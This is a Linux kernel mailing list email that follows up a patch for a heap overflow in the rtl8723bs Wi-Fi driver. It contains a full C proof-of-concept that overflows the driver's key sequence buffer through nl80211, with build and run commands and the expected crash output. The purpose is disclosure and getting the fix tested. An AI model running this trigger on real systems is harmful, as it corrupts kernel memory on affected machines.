Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.remote-ip=185.70.43.96
ARC-Seal: i=1; d=subspace.kernel.org; s=arc20261015; a=rsa-sha256; cv=none;
	t=1793801105;
	b=XLZ2lP9uYgpgGUOj3HT1Hjo+QzSasf0fr7xmkxLFWlgjmx4HrmO6EVjzD4leCq/VSh3N
	 mx0cgfnju+JUBz0C07GOP6fBGg+yXueaKuTCan3g263nQ73FkpRjR6+oFrtktiJIW/ytY
	 WH5OFiREJxH8ZS6I5PNVW0Za941l1v0eBgtoTNwa76fGKeTEEZJWyZNrqdMWhBD719GlT
	 zqN+ANOq2OcMoKXSPp0svC0CMlzfBRc/A4uRSs2vge+K7jw590GW5Ab6b3+n6vIbdsLFk
	 l7gBvBFS2RJSTweRsUElteFQMg8WPoYn8yHSVkMBkxEYif5Xd6W8hugkl6+VJgxFbDQ==
ARC-Message-Signature: i=1; d=subspace.kernel.org; s=arc20261015;
	a=rsa-sha256; c=relaxed/relaxed; t=1793801105;
	h=DMARC-Filter:DKIM-Signature:Date:To:From:Cc:Subject:Message-ID:
	 In-Reply-To:References:Feedback-ID:X-Pm-Message-ID:MIME-Version:
	 Content-Type:Content-Transfer-Encoding;
	bh=MAf+viOPyh2JY6q4/ySV6UPyFroTwgoq4MbJIwePkeU=;
	b=U2vJY6XRFxJWdoPwCn16HzX33eBRftShovS5zDe8JN+DAtAhkWCkREWEQ6kxYL9Vci6G
	 SZAvvsXvurTr+D6vT8eX/xzqw0CbbjBJj8Ir8Paui8nJFIu3xuf4nFCWi/c2c5ruapfGF
	 w27le0Pr4hagvoPnBisbwHv69t/HjbZmwJJc5zao/l2Bk27NkoOHfshud7TC5Ibia4STi
	 NQGB78+tZaIi7abe5so9lc9SEJkmcxa6D89FBhJhk60rwzbPByOmqp5JhRHiK+d0J1mQ/
	 ++KuYEOV/QmpnyjgDnuYDVnFyWIaKP4GeQRi5s9yMHHRjgifipJ+rSn1ZHGFgz7nPrA==
ARC-Authentication-Results: i=1; smtp.subspace.kernel.org; 
	dmarc=pass header.from=innora.ai;
	spf=pass smtp.mailfrom=innora.ai;
	dkim=pass header.d=innora.ai header.i=@innora.ai header.a=rsa-sha256 header.s=protonmail3 header.b=ZUE8W9w1;
	arc=none smtp.remote-ip=185.70.43.96
Received: from mail-4396.protonmail.ch (mail-4396.protonmail.ch [185.70.43.96])
	(using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
	 key-exchange X25519 server-signature ECDSA (prime256v1) server-digest SHA256)
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 8998D606A326
	for <stable@vger.kernel.org>; Wed,  4 Nov 2026 14:04:59 +0000 (UTC)
DMARC-Filter: OpenDMARC Filter v1.4.2 smtp.subspace.kernel.org 8998D606A326
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=reject dis=none) header.from=innora.ai
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=innora.ai
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key, unprotected) header.d=innora.ai header.i=@innora.ai header.a=rsa-sha256 header.s=protonmail3 header.b=ZUE8W9w1
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=innora.ai;
	s=protonmail3; t=1793801096; x=1794060296;
	bh=MAf+viOPyh2JY6q4/ySV6UPyFroTwgoq4MbJIwePkeU=;
	h=Date:To:From:Cc:Subject:Message-ID:In-Reply-To:References:
	 Feedback-ID:From:To:Cc:Date:Subject:Reply-To:Feedback-ID:
	 Message-ID:BIMI-Selector;
	b=ZUE8W9w1ZW0t76mfKHFrM6uwG6egPoDuPvHiV5Tf1+qTy4slP24Dlww+EQnrK0E+1
	 GaMUZ1N0C8n9pMazgN7HLXk1H8hpOUI//CTatvFesy+W1cTp5gS60uoUKqL4FphTB6
	 x/hodMv8V4JcLMsY6V+MSZsrnsgg3KqrT41KCjtwbk1axUTux8Ucre/4vgFbN0vMCT
	 gBUgmNbCidITKDgaCyA7/F8cdjcVjRiUYYwQ0uIYsjb51pSNCLcfC7ANDQzme48sIe
	 NFNvap26A7G8h+fy+OjTiaaqc+9f/d3/s57hae8+VnHv22DLaG3uyGd6tjgKh4paR6
	 l6dlRmBGySvlA==
Date: Wed, 04 Nov 2026 14:04:50 +0000
To: gregkh@linuxfoundation.org
From: Feng Ning <feng@innora.ai>
Cc: linux-staging@lists.linux.dev, linux-wireless@vger.kernel.org, luka.gejak@linux.dev, linux-kernel@vger.kernel.org, stable@vger.kernel.org, Feng Ning <feng@innora.ai>
Subject: Re: [RFC PATCH v7] staging: rtl8723bs: fix heap buffer overflow in cfg80211_rtw_add_key()
Message-ID: <20261104220434.677da673-2-feng@innora.ai>
In-Reply-To: <20261104220347.ccc09fa4-1-feng@innora.ai>
References: <20260413113224.5201-1-feng@innora.ai> <2026042626-tabloid-suitor-33c5@gregkh> <20260427111738.33069-1-feng@innora.ai> <2026050417-monkhood-backless-4c3e@gregkh> <20260504154823.52057-1-feng@innora.ai> <2026050458-numbness-haven-1ae4@gregkh> <20261104220347.ccc09fa4-1-feng@innora.ai>
Feedback-ID: 140578448:user:proton
X-Pm-Message-ID: 4cf252529bc12bbb696741956dbf03401e3d81c8
X-Mailing-List: stable@vger.kernel.org
List-Id: <stable.vger.kernel.org>
List-Post: <mailto:stable@vger.kernel.org>
List-Help: <mailto:stable+help@vger.kernel.org>
List-Subscribe: <mailto:stable+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:stable+unsubscribe@vger.kernel.org>
List-Owner: <mailto:stable+owner@vger.kernel.org>
Precedence: list
MIME-Version: 1.0
Content-Type: text/plain; charset=utf-8
Content-Transfer-Encoding: quoted-printable

As mentioned in the RFC, here is the userspace trigger for the
overflow, for anyone with rtl8723bs hardware willing to test.

It sends NL80211_CMD_NEW_KEY with a 16-byte NL80211_ATTR_KEY_SEQ
(8 bytes more than ieee_param.crypt.seq holds) on a monitor-less
managed interface.  On an unpatched kernel with KASAN enabled it
should produce:

  BUG: KASAN: slab-out-of-bounds in cfg80211_rtw_add_key
  Write of size 16 ...

On a kernel with the v7 patch applied, the same command should
return NLMSG_ERROR with errno EINVAL and no splat.

Build (needs libnl-3.0 / libnl-genl-3.0):

  gcc -o poc poc_seq_overflow.c $(pkg-config --cflags --libs libnl-3.0 libn=
l-genl-3.0)

Run:

  sudo ./poc wlan0

Requires CAP_NET_ADMIN and an rtl8723bs interface present.

--- poc_seq_overflow.c ---

/*
 * PoC: rtl8723bs cfg80211_rtw_add_key seq[] heap buffer overflow
 *
 * Bug:  drivers/staging/rtl8723bs/os_dep/ioctl_cfg80211.c ~line 887
 *       memcpy(param->u.crypt.seq, params->seq, params->seq_len);
 *
 *       param->u.crypt.seq =3D u8 seq[8]  (fixed 8 bytes, ieee80211.h:190)
 *       params->seq_len    =3D up to 16   (NL80211_KEY_SEQ .len=3D16, nl80=
211.c:956)
 *       Result: 8-byte heap overflow WRITE past seq[8]
 *
 * Overwritten fields (struct ieee_param.u.crypt):
 *       offset 37: seq[8]    =E2=86=90 8 bytes written legitimately
 *       offset 45: pad       =E2=86=90 1 byte overflow
 *       offset 46: key_len   =E2=86=90 2 bytes overflow (u16, corrupted)
 *       offset 48: key[]     =E2=86=90 5 bytes overflow
 *
 * Trigger: NL80211_CMD_NEW_KEY with 16-byte NL80211_ATTR_KEY_SEQ
 * Requires: CAP_NET_ADMIN + rtl8723bs WiFi interface loaded
 * Build:    gcc -o poc poc_seq_overflow.c $(pkg-config --cflags --libs lib=
nl-3.0 libnl-genl-3.0)
 * Run:      sudo ./poc wlan0
 * Expect:   dmesg =E2=86=92 KASAN: slab-out-of-bounds WRITE in cfg80211_rt=
w_add_key
 *
 * CWE-122 | CVSS 6.7 (AV:L/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H)
 *
 * Author: Feng Ning (feng@innora.ai) =E2=80=94 Innora Security Research
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <net/if.h>
#include <netlink/genl/genl.h>
#include <netlink/genl/ctrl.h>

/* nl80211 command and attribute IDs */
#define NL80211_CMD_NEW_KEY       13
#define NL80211_ATTR_IFINDEX       3
#define NL80211_ATTR_KEY_DATA     25
#define NL80211_ATTR_KEY_IDX      26
#define NL80211_ATTR_KEY_CIPHER   27
#define NL80211_ATTR_KEY_SEQ      28
#define WLAN_CIPHER_SUITE_TKIP    0x000FAC02

int main(int argc, char **argv)
{
    struct nl_sock *sk;
    struct nl_msg *msg;
    int fam, ifidx, ret;

    if (argc < 2) {
        fprintf(stderr, "Usage: sudo %s <wlan_interface>\n", argv[0]);
        fprintf(stderr, "  Requires rtl8723bs driver and CAP_NET_ADMIN\n");
        return 1;
    }

    ifidx =3D if_nametoindex(argv[1]);
    if (!ifidx) {
        perror("if_nametoindex");
        return 1;
    }

    sk =3D nl_socket_alloc();
    if (!sk) { perror("nl_socket_alloc"); return 1; }

    if (genl_connect(sk) < 0) {
        fprintf(stderr, "genl_connect failed\n");
        return 1;
    }

    fam =3D genl_ctrl_resolve(sk, "nl80211");
    if (fam < 0) {
        fprintf(stderr, "nl80211 family not found\n");
        return 1;
    }

    msg =3D nlmsg_alloc();
    genlmsg_put(msg, 0, 0, fam, 0, 0, NL80211_CMD_NEW_KEY, 0);

    nla_put_u32(msg, NL80211_ATTR_IFINDEX, ifidx);
    nla_put_u8(msg, NL80211_ATTR_KEY_IDX, 0);
    nla_put_u32(msg, NL80211_ATTR_KEY_CIPHER, WLAN_CIPHER_SUITE_TKIP);

    /* TKIP requires 32-byte key */
    uint8_t key[32];
    memset(key, 0x41, sizeof(key));
    nla_put(msg, NL80211_ATTR_KEY_DATA, sizeof(key), key);

    /*
     * OVERFLOW TRIGGER
     *
     * NL80211_ATTR_KEY_SEQ with 16 bytes.  nl80211.c allows up to 16.
     * cfg80211 passes this to driver as params->seq / params->seq_len=3D16=
.
     * rtl8723bs copies all 16 bytes into seq[8] =E2=86=92 8 bytes past bou=
ndary.
     *
     * The overflow pattern 0x42 ('B') will be visible in KASAN output
     * and in the corrupted key_len / key[] fields.
     */
    uint8_t seq[16];
    memset(seq, 0x42, sizeof(seq));
    nla_put(msg, NL80211_ATTR_KEY_SEQ, sizeof(seq), seq);

    printf("[*] rtl8723bs seq[] heap overflow PoC\n");
    printf("[*] Interface: %s (ifindex %d)\n", argv[1], ifidx);
    printf("[*] Sending NL80211_CMD_NEW_KEY with seq_len=3D16 (buffer=3D8)\=
n");

    ret =3D nl_send_auto(sk, msg);
    if (ret < 0)
        fprintf(stderr, "[-] send failed: %s\n", nl_geterror(ret));
    else
        printf("[+] Sent %d bytes\n", ret);

    /* Receive response (will likely be -ENOLINK or similar, but overflow
     * already happened in the driver before the error path) */
    nl_recvmsgs_default(sk);

    nlmsg_free(msg);
    nl_socket_free(sk);

    printf("[*] Done. Check 'dmesg | grep KASAN' for heap overflow report.\=
n");
    return 0;
}

--- end ---

I have verified the trigger path by code review of the cfg80211 key
installation path (nl80211 NL80211_KEY_SEQ policy allows .len =3D 16
while the driver buffer is 8 bytes) but do not have the hardware to
run it myself; that is exactly what a Tested-by from this list would
add.

Thanks,
Feng Ning

